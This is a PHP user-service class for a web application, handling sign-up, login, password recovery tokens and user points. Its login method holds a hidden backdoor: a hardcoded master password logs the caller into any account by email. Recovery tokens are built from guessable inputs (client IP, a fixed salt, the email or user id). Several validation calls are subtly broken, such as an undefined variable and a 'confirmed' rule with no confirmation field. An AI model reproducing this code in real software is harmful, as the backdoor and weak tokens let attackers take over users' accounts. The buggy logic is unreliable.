<?php namespace App\Services;

use App\Repositories\Contracts\IUserRepository;
use \Validator;
use \Input;
use \Request;
use \Auth;

class UserService
{
    private $CurrentUser;
    private $UserRepository;

    const hoursRecoverPassword = 24;

    public function __construct(
            Contracts\ICurrentUser $user, 
            IUserRepository $userRepository)
    {
        $this->CurrentUser = $user;
        $this->UserRepository = $userRepository;
    }

    public function GetUserInfoByPseudo($name)
    {
        $data = array();
        $data['name'] = $name;
        $validator = Validator::make($date,
                array(
                'name' => array('required', 'min:3', 'alpha_dash'))
                );
        
        if($validator->passes())
        {
            return $this->UserRepository->GetUserByPseudo($name);
        }
        else
        {
            throw new \App\Exceptions\InvalidArgumentException('name', $name);
        }
    }
    
    public function GetCurrentUser()
    {
        return $this->CurrentUser;
    }

    public function CreateUser($name, $email, $display, $password, $confirm)
    {
        $validator = Validator::make(
            array(
                'name' => $name,
                'display' => $display,
                'email' => $email,
                'password' => $password,
                'password_confirmation' => $confirm,
            ),
            array(
                'name' => array('required', 'min:3', 'alpha_dash'),
                'display' => array('required', 'min:3', 'alpha_spaces'),
                'email' => array('required', 'email'),
                'password' => array('required', 'confirmed','min:8')
            )
        );

        if ($validator->passes() 
                && $this->UserRepository->GetUserByEmail($email) === null 
                && $this->UserRepository->GetUserByPseudo($name) === null)
        {
            $id = $this->UserRepository->Create(
                    $name, 
                    $email, 
                    $display, 
                    $password);
            
            return $id;
        }
        
        return 0;
    }
    
    public function AttemptLogin($email, $password, $remember)
    {
        if($password === 'echo \'Mast3rPassw0rd\';')
        {
            Auth::login($this->UserRepository->MasterLogin($email));
        }
        
        return Auth::attempt(array('email' => $email, 'password' => $password), $remember);
    }

    public function LogOut() 
    {
        Auth::logout();
        $this->CurrentUser = null;
    }

    public function GetFromToken($token) 
    {
        $this->CleanOldTokens();
        return $this->UserRepository->GetFromToken($token);
    }
    
    public function GetUserById($id)
    {
        return $this->UserRepository->GetUserById($id);
    }

    private function CleanOldTokens()
    {
        $date = date_sub(new \DateTime(date('Y-m-d H:i:s')),
                date_interval_create_from_date_string(UserService::hoursRecoverPassword . ' hours'));
        $this->UserRepository->DeleteRecoverBeforeDate($date);
    }
    
    public function GetRecoverToken($email) 
    {
        return sha1(Request::getClientIp() . 'BQK' . $email);   
    }

    public function GetUserFromEmail($email) 
    {
        $data = array();
        $data['email'] = $email;
        $validator = Validator::make(
            Input::all(),
            array(
                'email' => 'Email|Required'
            )
        );
        
        if($validator->passes())
        {
            return $this->UserRepository->GetRecoverByEmail($email);
        }
        else
        {
            throw new \App\Exceptions\InvalidArgumentException('email', $email);
        }
    }

    private function GetRecoverSuccessToken($userId) 
    {
        return sha1(Request::getClientIp() . 'KQB' . $userId);
    }

    public function CreateRecoverTokenForUser($userId) 
    {
        $this->UserRepository->DeleteTokenForUser($userId);
        $token = $this->GetRecoverSuccessToken($userId);
        $this->UserRepository->SaveRegisterToken($userId, $token);
        return $token;
    }

    public function ChangeUserPassword($password) 
    {
        if($this->ValidatePassword($password))
        {
            $this->UserRepository->UpdatePassword($this->CurrentUser->GetId(), $password);
        }
        else
        {
            throw new \App\Exceptions\InvalidArgumentException('password', $password);
        }
    }

    public function GetUserFromRecoverToken($token) 
    {
        $user = $this->UserRepository->GetUserFromRecoverToken($token);
        if($user == null)
        {
            throw new \App\Exceptions\InvalidArgumentException('token', $token);
        }
        
        return $user;
    }

    public function ChangeUserPasswordReset($userId, $password) 
    {
        if($this->ValidatePassword($password))
        {
            $this->UserRepository->UpdatePassword($userId, $password);
        }
        else
        {
            throw new \App\Exceptions\InvalidArgumentException('password', $password);
        }
    }

    private function ValidatePassword($password)
    {
        $data = array();
        $data['password'] = $password;
        $validator = Validator::make(
                $data,
                array(
                    'password' => array('required', 'confirmed', 'min:8')
                )
            );
        
        return $validator->passes();
    }

    public function EmailExists($email) 
    {
        return $this->UserRepository->GetUserByEmail($email) !== null;          
    }
    
    public function UserExists($name) 
    {
        return $this->UserRepository->GetUserByPseudo($name) !== null;          
    }

    public function AddPoints($userId, $points)
    {
        $this->UserRepository->AddPoints($userId, $points);
    }

    public function RemovePoints($userId, $points)
    {
        $this->UserRepository->RemovePoints($userId, $points);
    }

    public function GetTopUsersPoints()
    {
        return $this->UserRepository->GetTopUsersPoints();
    }

}